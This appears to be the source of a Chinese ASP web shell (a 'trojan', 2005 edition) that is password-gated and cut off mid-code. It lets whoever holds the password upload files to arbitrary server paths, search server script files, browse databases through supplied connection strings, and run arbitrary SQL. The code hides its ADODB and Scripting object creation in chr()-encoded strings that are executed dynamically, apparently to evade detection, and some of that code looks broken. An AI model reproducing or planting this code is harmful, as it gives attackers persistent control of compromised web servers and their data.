<%@ LANGUAGE="VBSCRIPT"  cODEpagE ="936"
'ÃÜÂëµÚÒ»¸öÊÇÃÜÂë1,µÚ¶þ¸öÊÇÃÜÂë2,²éÕÒÌæ»»ÕâÁ½¸öµ¥´Ê¾Í¿ÉÒÔ¸Ä³É±ðµÄÃÜÂëÁË%>
<ObjEct runat=sErvEr iD=ObjFsOlhn scOpE=pagE classiD="clsiD:0D43FE01-F093-11CF-8940-00A0C9054228"></ObjEct>
<ObjEct runat=sErvEr iD=OScriptlhn scOpE=pagE classiD="clsiD:72C24DD5-D70A-438B-8A42-98424B88AFB8"></ObjEct>
<ObjEct runat=sErvEr iD=OScriptNEtlhn scOpE=pagE classiD="clsiD:093FF999-1EA0-4079-9525-9614C3504B74"></ObjEct>
<%iF Err thEn%>
<ObjEct runat=sErvEr iD=OScriptlhn scOpE=pagE classiD="clsiD:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></ObjEct>
<ObjEct runat=sErvEr iD=OScriptNEtlhn scOpE=pagE classiD="clsiD:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></ObjEct>
<%
EnD iF %>
<stylE>
BODY {SCROLLBAR-FACE-COLOR: #FFE1E8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #FFE1E8; SCROLLBAR-SHADOW-COLOR: #FF9Dbb; COLOR: #F486a8; SCROLLBAR-3DLIGHT-COLOR: #FF97b9; SCROLLBAR-ARROW-COLOR: #FF6F8F; SCROLLBAR-TRACK-COLOR: #FFE1E8; SCROLLBAR-DARKSHADOW-COLOR: #FFD9E0}
a:link {FOnt-sizE: 9pt;cOlOr: #FF69b4;tExt-DEcOratiOn: nOnE;}
a:visitED {FOnt-sizE: 9pt;cOlOr: #Db7093;tExt-DEcOratiOn: nOnE;}
a:hOvEr {FOnt-sizE: 9pt;cOlOr: #FFb6c1;tExt-DEcOratiOn: nOnE;}
tablE {BORDER-COLLAPSE: cOllapsE;bOrDEr: 1px DOttED #EFEFEF;FOnt-sizE: 9pt;}
.nObOrDEr {FOnt-sizE: 9pt;bOrDEr: nOnE;}
input {FOnt-sizE: 9pt;cOlOr: #c875a5;backgrOunD-imagE: lEttEr-spacing: nOrmal;vErtical-align: miDDlE;wOrD-spacing: nOrmal;whitE-spacE: nOrmal;bOrDEr: 1px DOttED #c875a5;clEar: bOth;hEight: autO;wiDth: autO;backgrOunD-rEpEat: rEpEat;OvErFlOw: hiDDEn;}
tExtarEa {FOnt-sizE: 9pt;backgrOunD-imagE: lEttEr-spacing: nOrmal;vErtical-align: miDDlE;wOrD-spacing: nOrmal;clEar:nOnE;hEight: autO;wiDth: autO;bOrDEr: 1px DOttED #c875a5;cOlOr: #c875a5;}
</stylE>
<META http-Equiv=COntEnt-TypE cOntEnt="tExt/html; charsEt=gb2312">
<titlE>::::º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2005¦Á°æ::::</titlE>
<%'ÉÏ´«´úÂëÒò»¯¾³µÄÌ«³¤£¬ÕâÍêÈ«ÊÇ³¹ðÁÖÀÏ±øµÄ£¬¶Ô´Ë±íÊ¾¸ÐÐ»--ÉÏ´«Àà¶¨Òå
rEspOnsE.buFFEr=truE
FilEnamE=REquEst.SErvErVariablEs("URL")
SErvEr.ScriptTimEOut=5000
On ErrOr REsumE NExt
Dim OUpFilEStrEam
Class UpFilE_Class
Dim FOrm,FilE,ascstr
Public Sub GEtDatE (REtSizE)
'¶¨Òå±äÁ¿
  Dim REquEstBinDatE,sSpacE,bCrLF,sInFO,iInFOStart,iInFOEnD,tStrEam,iStart,OFilEInFO
  Dim iFilESizE,sFilEPath,sFilETypE,sFOrmValuE,sFilENamE
  Dim iFinDStart,iFinDEnD
  Dim iFOrmStart,iFOrmEnD,sFOrmNamE
'´úÂë¿ªÊ¼
  IF REquEst.TOtalBytEs < 1 ThEn
 Err = 1
 Exit Sub
  EnD IF
  IF REtSizE > 0 ThEn
 IF REquEst.TOtalBytEs > REtSizE ThEn
 Err = 2
 Exit Sub
 EnD IF
  EnD IF
dim ascstr1
ascstr1=chr(20)&chr(32)&chr(32)&chr(83)&chr(69)&chr(116)&chr(32)&chr(70)&chr(79)&chr(114)&chr(109)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(32)&chr(40)&chr(34)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(105)&chr(110)&chr(103)&chr(46)&chr(68)&chr(105)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(97)&chr(114)&chr(121)&chr(34)&chr(41)
excute ascstr1
  FOrm.COmparEMODE = 1
dim ascstr2
ascstr2=chr(20)&chr(32)&chr(32)&chr(83)&chr(69)&chr(116)&chr(32)&chr(70)&chr(105)&chr(108)&chr(69)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(32)&chr(40)&chr(34)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(105)&chr(110)&chr(103)&chr(46)&chr(68)&chr(105)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(97)&chr(114)&chr(121)&chr(34)&chr(41)
excute ascstr2
  FilE.COmparEMODE = 1
dim ascstr3
ascstr3=chr(20)&chr(32)&chr(32)&chr(83)&chr(69)&chr(116)&chr(32)&chr(116)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(32)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(98)&chr(46)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(34)&chr(41)
excute ascstr3
dim ascstr4
ascstr4=chr(20)&chr(32)&chr(32)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(85)&chr(112)&chr(70)&chr(105)&chr(108)&chr(69)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(32)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(98)&chr(46)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(34)&chr(41)
excute ascstr4
  OUpFilEStrEam.TypE = 1
  OUpFilEStrEam.MODE = 3
  OUpFilEStrEam.OpEn
  OUpFilEStrEam.WritE REquEst.BinaryREaD (REquEst.TOtalBytEs)
  OUpFilEStrEam.POsitiOn = 0
  REquEstBinDatE = OUpFilEStrEam.REaD
  iFOrmEnD = OUpFilEStrEam.SizE
  bCrLF = ChrB (13)  ChrB (10)
  'È¡µÃÃ¿¸öÏîÄ¿Ö®¼äµÄ·Ö¸ô·û
  sSpacE = MiDB (REquEstBinDatE,1, InStrB (1,REquEstBinDatE,bCrLF)-1)
  iStart = LEnB  (sSpacE)
  iFOrmStart = iStart+2
  '·Ö½âÏîÄ¿
  DO
 iInFOEnD = InStrB (iFOrmStart,REquEstBinDatE,bCrLF  bCrLF)+3
 tStrEam.TypE = 1
 tStrEam.MODE = 3
 tStrEam.OpEn
 OUpFilEStrEam.POsitiOn = iFOrmStart
 OUpFilEStrEam.COpyTO tStrEam,iInFOEnD-iFOrmStart
 tStrEam.POsitiOn = 0
 tStrEam.TypE = 2
 tStrEam.CharSEt = "gb2312"
 sInFO = tStrEam.REaDTExt
 iFOrmStart = InStrB (iInFOEnD,REquEstBinDatE,sSpacE)-1
 iFinDStart = InStr (22,sInFO,"namE=""",1)+6
 iFinDEnD = InStr (iFinDStart,sInFO,"""",1)
 sFOrmNamE = MiD  (sinFO,iFinDStart,iFinDEnD-iFinDStart)
 IF InStr  (45,sInFO,"FilEnamE=""",1) > 0 ThEn
SEt OFilEInFO = nEw FilEInFO_Class
iFinDStart = InStr (iFinDEnD,sInFO,"FilEnamE=""",1)+10
iFinDEnD = InStr (iFinDStart,sInFO,"""",1)
sFilENamE = MiD  (sinFO,iFinDStart,iFinDEnD-iFinDStart)
OFilEInFO.FilENamE = MiD (sFilENamE,InStrREv (sFilENamE, "\")+1)
OFilEInFO.FilEPath = LEFt (sFilENamE,InStrREv (sFilENamE, "\"))
OFilEInFO.FilEExt = MiD (sFilENamE,InStrREv (sFilENamE, ".")+1)
iFinDStart = InStr (iFinDEnD,sInFO,"COntEnt-TypE: ",1)+14
iFinDEnD = InStr (iFinDStart,sInFO,vbCr)
OFilEInFO.FilETypE = MiD  (sinFO,iFinDStart,iFinDEnD-iFinDStart)
OFilEInFO.FilEStart = iInFOEnD
OFilEInFO.FilESizE = iFOrmStart -iInFOEnD -2
OFilEInFO.FOrmNamE = sFOrmNamE
FilE.aDD sFOrmNamE,OFilEInFO
 ElsE
tStrEam.ClOsE
tStrEam.TypE = 1
tStrEam.MODE = 3
tStrEam.OpEn
OUpFilEStrEam.POsitiOn = iInFOEnD
OUpFilEStrEam.COpyTO tStrEam,iFOrmStart-iInFOEnD-2
tStrEam.POsitiOn = 0
tStrEam.TypE = 2
tStrEam.CharSEt = "gb2312"
sFOrmValuE = tStrEam.REaDTExt
IF FOrm.Exists (sFOrmNamE) ThEn
  FOrm (sFOrmNamE) = FOrm (sFOrmNamE)  ", "  sFOrmValuE
  ElsE
  FOrm.ADD sFOrmNamE,sFOrmValuE
EnD IF
 EnD IF
 tStrEam.ClOsE
 iFOrmStart = iFOrmStart+iStart+2
  LOOp Until  (iFOrmStart+2) = iFOrmEnD
  REquEstBinDatE = ""
  SEt tStrEam = NOthing
EnD Sub
EnD Class
Class FilEInFO_Class
Dim FOrmNamE,FilENamE,FilEPath,FilESizE,FilETypE,FilEStart,FilEExt
Public FunctiOn SavETOFilE (Path)
  On ErrOr REsumE NExt
  Dim OFilEStrEam
dim ascstr5
ascstr5=chr(20)&chr(32)&chr(32)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(70)&chr(105)&chr(108)&chr(69)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(32)&chr(61)&chr(32)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(32)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(98)&chr(46)&chr(83)&chr(116)&chr(114)&chr(69)&chr(97)&chr(109)&chr(34)&chr(41)
excute ascstr5
  OFilEStrEam.TypE = 1
  OFilEStrEam.MODE = 3
  OFilEStrEam.OpEn
  OUpFilEStrEam.POsitiOn = FilEStart
  OUpFilEStrEam.COpyTO OFilEStrEam,FilESizE
  OFilEStrEam.SavETOFilE Path,2
  OFilEStrEam.ClOsE
  SEt OFilEStrEam = NOthing
EnD FunctiOn
Public FunctiOn FilEDatE
  OUpFilEStrEam.POsitiOn = FilEStart
  FilEDatE = OUpFilEStrEam.REaD (FilESizE)
  EnD FunctiOn
EnD Class
%>
<% iF REquEst("passwOrDlcx")="ÃÜÂë1" thEn
sEssiOn("passwOrDlcx")="lcx"
rEspOnsE.rEDirEct REquEst.SErvErVariablEs("URL")
ElsEiF sEssiOn("passwOrDlcx")=""thEn
%>
<FORM namE="usEr" mEthOD="POST">
<cEntEr><br><br><br><br><br><br><br><br><br><br>
<FORM namE="usEr" mEthOD="POST"> <INPUT TYPE=passwOrD NAME=passwOrDlcx stylE="bOrDEr:1px sOliD #99CC00; "> <INPUT TYPE=Submit VALUE="º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2005¦Á°æ" stylE="bOrDEr:1px sOliD #99CC00; "> </FOrm></cEntEr>
<%ElsE%>
<%
iF rEquEst("up")="yEs" thEn
sEt uplOaD=nEw UpFilE_Class
uplOaD.GEtDatE (1024*1024)
FOr Each FOrmNamE in uplOaD.FilE
sEt FilE=uplOaD.FilE(FOrmNamE)
 iF FilE.FilESizE>0 thEn
 savEpath=uplOaD.FOrm("FilEpath")
 FilE.SavETOFilE savEpath
 rEspOnsE.writE "ÉÏ´«³É¹¦!ÉÏ´«ºóµÄÂ·¾¶Îª"savEpath"<br>"
 rEspOnsE.writE "<cEntEr><br><a hrEF=""javascript:histOry.back();""><FOnt cOlOr='#D00000'>·µ»ØÉÏÒ»Ò³</FOnt></a></cEntEr>"
EnD iF
sEt FilE=nOthing
nExt
sEt uplOaD=nOthing
shOwErr()
rEspOnsE.EnD
EnD iF
%>
<%
FunctiOn Out()
REspOnsE.COOkiEs("passwOrD")=""
rEspOnsE.rEDirEct ""url""
EnD FunctiOn%>
<%'-------------------ËÑË÷ÎÄ¼þº¯Êý------------------
On ErrOr rEsumE nExt
SEarchString = REquEst("SEarchString")
cOunt=0
FunctiOn SEarchFilE( F, s, titlE )
SEt FO = ObjFsOlhn.OpEnTExtFilE(F)
cOntEnt = FO.REaDAll'¶ÁÈ«²¿ÎÄ±¾µ½cOntEnt
FO.ClOsE
SEarchFilE = inStr(1, cOntEnt, S, vbTExtCOmparE)>0  '´ÓµÚÒ»¸ö×Ö·û¿ªÊ¼¼ì²écOntEntÀïÃæÊÇ·ñÓÐS
IF SEarchFilE ThEn'Èç¹ûÓÐ,ÔòÌá³öÎÄ¼þTITLE´æÈë±äÁ¿
pOs1 = InStr(1, cOntEnt, "<TITLE>", vbTExtCOmparE)
pOs2 = InStr(1, cOntEnt, "</TITLE>", vbTExtCOmparE)
titlE = ""
IF pOs1 > 0 AnD pOs2 > 0 ThEn'È¡TITLE±ê¼ÇÖÐ¼äµÄ×Ö·û
titlE = MiD( cOntEnt, pOs1 + 7, pOs2 - pOs1 - 7 )
EnD IF
EnD IF
EnD FunctiOn
FunctiOn FilELink( F, titlE )
vPath =F.Path'È¡Â·¾¶
IF titlE = "" ThEn titlE = F.NamE'×öÁ´½Ó
'FilELink = "<A HREF="""  vPath  """>"  titlE  "</A>"
FilELink = vPath
FilELink = "<UL>¡¤"  FilELink  "</UL>"
EnD FunctiOn
Sub SEarchFOlDEr( FD, s )
FOunD = FalsE
FOr Each F In FD.FilEs
pOs = InStrREv(F.Path, "." )
IF pOs > 0 ThEn
Ext = MiD(F.Path, pOs + 1 )
ElsE
Ext = ""
EnD IF
IF LCasE(Ext) = "asp" Or LCasE(Ext) = "asa" Or LCasE(Ext) = "cEr"  Or LCasE(Ext) = "cDx" ThEn
IF SEarchFilE( F, s, titlE ) ThEn
REspOnsE.WritE FilELink(F, titlE)
cOunt=cOunt+1
EnD IF
EnD IF
NExt
FOr Each sFD In FD.SubFOlDErs
SEarchFOlDEr sFD, s
NExt
EnD Sub'ËÑË÷½áÊø%>
<%'-------------------------mssqlµÄsqlÀ©Õ¹¿ªÊ¼---------------------------------
Dim strsql, ObjDBCOnn, ObjRS, intFiElDCOunt, intCOuntEr,strcOn
strcOn =trim(REquEst.FOrm("strcOn"))
strsql =trim(REquEst.FOrm("SQL"))
iF strSQL <> "" anD lcasE(lEFt(trim(strsql),6))<>"sElEct" ThEn
REspOnsE.WritE "SQLÃüÁî: "  strsql  "³É¹¦ÔËÐÐ<br>"
dim ascstr6
ascstr6=chr(20)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(98)&chr(106)&chr(68)&chr(66)&chr(67)&chr(79)&chr(110)&chr(110)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(66)&chr(46)&chr(67)&chr(79)&chr(110)&chr(110)&chr(69)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)
excute ascstr6
  ObjDBCOnn.OpEn strcOn
 ObjDbcOnn.ExEcutE(strsql)
 ObjDBCOnn.ClOsE
SEt ObjDBCOnn = NOthing
EnD iF
'-----------------------------------Êý¾Ý¿â¼ÇÂ¼ÁÐ±í----------------------------------------
DBDrivEr = "PrOviDEr=MicrOsOFt.JEt.OLEDB.4.0;Data SOurcE="
strROOtFOlDEr = SErvEr.MapPath("/")
scriptnamE = REquEst.SErvErVariablEs("SCRIPT_NAME")
iF rEquEst("Op")="Db" anD rEquEst("DbnamE")<>"" anD rEquEst("tablEnamE")<>"" thEn
DbnamE=trim(rEquEst("DbnamE"))
tablEnamE=rEquEst("tablEnamE")
dim ascstr7
ascstr7=chr(20)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(98)&chr(106)&chr(67)&chr(79)&chr(110)&chr(110)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(66)&chr(46)&chr(67)&chr(79)&chr(110)&chr(110)&chr(69)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)
excute ascstr7
iF instr(DbnamE,"InFO=FalsE")>0  thEn
ObjCOnn.COnnEctiOnString = DbnamE
ElsE
ObjCOnn.COnnEctiOnString = DBDrivEr  DbnamE
EnD iF
ObjCOnn.OpEn
SEt ObjTablERS = ObjCOnn.OpEnSchEma(20,Array(Empty, Empty, Empty, "TABLE"))
iF tablEnamE="" thEn tablEnamE=ObjTablERS("TablE_NamE").ValuE
%>
<tablE wiDth="100%" bOrDEr="1" cEllspacing="0" cEllpaDDing="5" bOrDErcOlOrlight="#000000" bOrDErcOlOrDark="#FFFFFF">
  <tr><tD wiDth="19%" align="cEntEr" valign="tOp"><a hrEF="<%=scriptnamE%>?Op=DbDbnamE=<%=SErvEr.URLEncODE(DbnamE)%>"><%=ObjFsOlhn.GEtFilEnamE(DbnamE)%></a><br>
<br>
<tablE wiDth="95%" bOrDEr="0" cEllspacing="0" cEllpaDDing="6">
  <%DO WhilE NOt ObjTablERS.EOF%>
  <tr>
 <tD><FOnt sizE="4" FacE="WingDings">3</FOnt> <a hrEF="<%=scriptnamE%>?Op=DbDbnamE=<%=SErvEr.URLEncODE(DbnamE)%>tablEnamE=<%=SErvEr.URLEncODE(ObjTablERS("TablE_NamE").ValuE)%>"><%=ObjTablERS("TablE_NamE").ValuE%></a></tD>
  </tr>
  <%ObjTablERS.MOvENExt
  LOOp%>
</tablE>
 </tD>
 <tD wiDth="81%" valign="tOp">
<tablE wiDth="100%" bOrDEr="0" cEllspacing="0" cEllpaDDing="0">
  <tr valign="tOp">
 <tD align="cEntEr" valign="tOp"><FOnt cOlOr="#330099"><%=tablEnamE%></FOnt>
<FOrm actiOn="<%=scriptnamE%>" mEthOD="pOst" namE="sqlcmD" iD="sqlcmD">
  <tablE wiDth="100%" bOrDEr="0" cEllspacing="0" cEllpaDDing="0">
 <tr valign="tOp">
<tD align="cEntEr"> <input namE="cmD" typE="tExt" iD="cmD" sizE="60">
  <input namE="Op" typE="hiDDEn" iD="Op" valuE="sql"> <input namE="DbnamE" typE="hiDDEn" iD="DbnamE" valuE="<%=rEquEst("DbnamE")%>">
  <input typE="submit" valuE="Ö´ÐÐSQL"></tD></tr></tablE></FOrm> </tD></tr></tablE>
<tablE wiDth="100%" bOrDEr="1" cEllspacing="0" cEllpaDDing="3" bOrDErcOlOrlight="#000000" bOrDErcOlOrDark="#FFFFFF">
<tr bgcOlOr="#CCCCCC" align="cEntEr" valign="tOp">
<%Dim mysql,i,j
j=1
mysql="SElEct TOp 10 * FrOm ["&tablEnamE&"]"
SEt ObjRS=ObjCOnn.ExEcutE(mysql)
FOr i=0 tO ObjRs.FiElDs.COunt-1
REspOnsE.writE"<tD><b>"&ObjRS.FiElDs(i).namE&"</b></tD>"
NExt
REspOnsE.writE "</tr>"
iF Objrs.EOF thEn
ElsE
DO WhilE NOT ObjRS.EOF
REspOnsE.writE "<tr>"
%>
<%
FOr i=0 tO ObjRs.FiElDs.COunt-1
REspOnsE.writE"<tD>"
IF IsNull(ObjRs.FiElDs(i).valuE) Or ObjRs.FiElDs(i).valuE="" Or ObjRs.FiElDs(i).valuE=" " thEn
rEspOnsE.writE "&nbsp;"
ElsE
  REspOnsE.writE SErvEr.HTMLEncODE(ObjRs.FiElDs(i).valuE)
 EnD iF
REspOnsE.writE"</tD>"
NExt
REspOnsE.writE"</tr>"
ObjRS.MOvENExt
j=j+1
LOOp
EnD iF
sEt ObjRs = nOthing
sEt ObjTablERS = nOthing
ObjCOnn.ClOsE
sEt ObjCOnn = nOthing
%>
</tablE>
<p>×î¶àÏÔÊ¾10Ìõ¼ÇÂ¼£¬Òª²ì¿´¸ü¶à¼ÇÂ¼ÇëÊ¹ÓÃSQLÃüÁî</p><br>
</tablE>
<%
REspOnsE.EnD
EnD iF
%>
<%
'----------------------------Êý¾Ý¿â¶ÔÏóÁÐ±í---------------------------------------------
iF rEquEst("Op")="Db" anD rEquEst("DbnamE")<>"" thEn
DbnamE=trim(rEquEst("DbnamE"))
dim ascstr8
ascstr8=chr(20)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(98)&chr(106)&chr(67)&chr(79)&chr(110)&chr(110)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(66)&chr(46)&chr(67)&chr(79)&chr(110)&chr(110)&chr(69)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)
excute ascstr8
'ObjCOnn.COnnEctiOnString = DBDrivEr & DbnamE
iF instr(DbnamE,"InFO=FalsE")>0  thEn
ObjCOnn.COnnEctiOnString = DbnamE
ElsE
ObjCOnn.COnnEctiOnString = DBDrivEr & DbnamE
EnD iF
ObjCOnn.OpEn
SEt ObjTablERS = ObjCOnn.OpEnSchEma(20,Array(Empty, Empty, Empty, "TABLE"))
%>
<tablE wiDth="100%" bOrDEr="1" cEllspacing="0" cEllpaDDing="5" bOrDErcOlOrlight="#000000" bOrDErcOlOrDark="#FFFFFF">
  <tr>
 <tD wiDth="19%" align="cEntEr" valign="tOp"><a hrEF="<%=scriptnamE%>?Op=Db&DbnamE=<%=DbnamE%>"><%=ObjFsOlhn.GEtFilEnamE(DbnamE)%></a><br>
<br>
<tablE wiDth="95%" bOrDEr="0" cEllspacing="0" cEllpaDDing="6">
  <%DO WhilE NOt ObjTablERS.EOF%>
  <tr>
 <tD><FOnt sizE="4" FacE="WingDings">3</FOnt> <a hrEF="<%=scriptnamE%>?Op=Db&DbnamE=<%=SErvEr.URLEncODE(DbnamE)%>&tablEnamE=<%=SErvEr.URLEncODE(ObjTablERS("TablE_NamE").ValuE)%>"><%=ObjTablERS("TablE_NamE").ValuE%></a></tD>
  </tr>
  <%ObjTablERS.MOvENExt
  LOOp
  ObjTablERS.MOvEFirst%>
</tablE>
 </tD>
 <tD wiDth="81%" align="cEntEr" valign="tOp"><a hrEF="<%=scriptnamE%>?Op=sql&DbnamE=<%=DbnamE%>">Ö´ÐÐSQLÃüÁî<br>
</a>
<%WhilE NOt ObjTablERS.EOF%>
<tablE wiDth="98%" bOrDEr="1" cEllspacing="0" cEllpaDDing="3" bOrDErcOlOrlight="#000000" bOrDErcOlOrDark="#FFFFFF">
  <tr align="cEntEr" bgcOlOr="#FFFFCC">
 <tD cOlspan="6"><FOnt cOlOr="#660000" sizE="2"><b><%=ObjTablERS("TablE_NamE").ValuE%></b></FOnt></tD>
  </tr> <tr align="cEntEr">  <tD>×Ö¶ÎÃû</tD> <tD>Êý¾ÝÀàÐÍ</tD><tD>×Ö¶Î´óÐ¡</tD><tD>¾«¶È</tD><tD>ÊÇ·ñÔÊÐíÎª¿Õ</tD><tD>Ä¬ÈÏÖµ</tD> </tr> <tr>
  <%SEt ObjCOlumnRS = ObjCOnn.OpEnSchEma(4,Array(Empty, Empty, ObjTablERS("TablE_NamE").ValuE))
  WhilE NOt ObjCOlumnRS.EOF
  iLEngth = ObjCOlumnRS("CharactEr_Maximum_LEngth")
  iPrEcisiOn = ObjCOlumnRS("NumEric_PrEcisiOn")
 iScalE = ObjCOlumnRS("NumEric_ScalE")
  iDEFaultValuE = ObjCOlumnRS("COlumn_DEFault")
 IF IsNull(iLEngth) thEn iLEngth = "&nbsp;"
 IF IsNull(iPrEcisiOn) thEn iPrEcisiOn = "&nbsp;"
  IF IsNull(iScalE) thEn iScalE = "&nbsp;"
  IF IsNull(iDEFaultValuE) thEn iDEFaultValuE = "&nbsp;"%>
 <tD wiDth="29%" hEight="8"><%=ObjCOlumnRS("COlumn_NamE")%></tD>
 <tD wiDth="12%" hEight="8"><%=FiElDtypE(ObjCOlumnRS("Data_TypE"))%></tD>
 <tD wiDth="11%" hEight="8"><%=iLEngth%></tD>
 <tD wiDth="9%" hEight="8"><%=iPrEcisiOn%></tD>
 <tD wiDth="17%" align="cEntEr" hEight="8">
<%IF ObjCOlumnRS("Is_NullablE") thEn
REspOnsE.WritE "ÊÇ"
ElsE
REspOnsE.writE "·ñ"
  EnD IF%>
 </tD>
 <tD wiDth="22%" hEight="8"><%=iDEFaultValuE%></tD>
  </tr>
  <%ObjCOlumnRS.MOvENExt
 WEnD
 ObjTablERS.MOvENExt
 SEt ObjCOlumnRS = NOthing
REspOnsE.writE "<br>"
WEnD
ObjTablERS.ClOsE
SEt ObjTablERS = NOthing
ObjCOnn.ClOsE
SEt ObjCOnn = NOthing
%>
 </tablE> </tD> </tablE>
<%
REspOnsE.EnD
EnD iF
%>
<%
'----------------------------Ö´ÐÐSQLÃüÁî---------------------------------------------
iF rEquEst("Op")="sql" thEn
DbnamE=trim(rEquEst("DbnamE"))
dim ascstr9
ascstr9=chr(20)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(98)&chr(106)&chr(67)&chr(79)&chr(110)&chr(110)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(66)&chr(46)&chr(67)&chr(79)&chr(110)&chr(110)&chr(69)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)
excute ascstr9
'ObjCOnn.COnnEctiOnString = DBDrivEr & DbnamE
iF instr(DbnamE,"InFO=FalsE")>0  thEn
ObjCOnn.COnnEctiOnString = DbnamE
ElsE
ObjCOnn.COnnEctiOnString = DBDrivEr & DbnamE
EnD iF
ObjCOnn.OpEn
SEt ObjTablERS = ObjCOnn.OpEnSchEma(20,Array(Empty, Empty, Empty, "TABLE"))
j=0
%>
<tablE wiDth="100%" bOrDEr="1" cEllspacing="0" cEllpaDDing="5" bOrDErcOlOrlight="#000000" bOrDErcOlOrDark="#FFFFFF">
  <tr>
 <tD wiDth="13%" align="cEntEr" valign="tOp"><a hrEF="<%=scriptnamE%>?Op=Db&DbnamE=<%=SErvEr.URLEncODE(DbnamE)%>"><%=ObjFsOlhn.GEtFilEnamE(DbnamE)%></a><br>
<br>
<tablE wiDth="95%" bOrDEr="0" cEllspacing="0" cEllpaDDing="6">
  <%DO WhilE NOt ObjTablERS.EOF%>
  <tr>
 <tD><FOnt sizE="4" FacE="WingDings">3</FOnt> <a hrEF="<%=scriptnamE%>?Op=Db&DbnamE=<%=SErvEr.URLEncODE(DbnamE)%>&tablEnamE=<%=SErvEr.URLEncODE(ObjTablERS("TablE_NamE").ValuE)%>"><%=ObjTablERS("TablE_NamE").ValuE%></a></tD>
  </tr>
  <%ObjTablERS.MOvENExt
  LOOp%>
</tablE>
 </tD>
 <tD wiDth="87%" align="cEntEr" valign="tOp">
<FOrm actiOn="<%=scriptnamE%>" mEthOD="pOst" namE="sqlcmD" iD="sqlcmD">
<tablE wiDth="100%" bOrDEr="0" cEllspacing="0" cEllpaDDing="0">
  <tr valign="tOp">
 <tD align="cEntEr">
 <input namE="cmD" typE="tExt" iD="cmD" sizE="60">
  <input namE="Op" typE="hiDDEn" iD="Op" valuE="sql">
  <input namE="DbnamE" typE="hiDDEn" iD="DbnamE" valuE="<%=rEquEst("DbnamE")%>">
  <input typE="submit" valuE="Ö´ÐÐSQL"></tD>
  </tr>
</tablE>
</FOrm>
<tablE wiDth="100%" bOrDEr="1" cEllspacing="0" cEllpaDDing="3" bOrDErcOlOrlight="#000000" bOrDErcOlOrDark="#FFFFFF">
  <tr bgcOlOr="#CCCCCC" align="cEntEr" valign="tOp">
<%iF rEquEst("cmD")<>"" thEn
mysql=rEquEst("cmD")
SEt ObjRS=ObjCOnn.ExEcutE(mysql)
iF Objrs.statE = 1 thEn
